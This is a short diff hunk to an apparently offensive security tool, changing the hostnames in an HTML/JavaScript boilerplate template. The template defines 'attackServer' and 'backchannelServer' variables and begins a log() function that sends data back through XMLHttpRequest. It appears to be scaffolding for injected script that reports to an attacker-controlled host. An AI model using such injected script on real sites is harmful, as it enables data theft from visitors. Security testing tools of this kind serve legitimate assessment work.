@@ -116,8 +116,8 @@ log.setLevel(logging.ERROR)
 boilerplate = '''
 <img src="loaded">
 <script>
-var backchannelServer = 'bc.ex.$BASE$';
-var attackServer = 'ex.$BASE$';
+var backchannelServer = 'bc.$BASE$';
+var attackServer = '$BASE$';
 
 function log(data) {
     var sreq = new XMLHttpRequest();
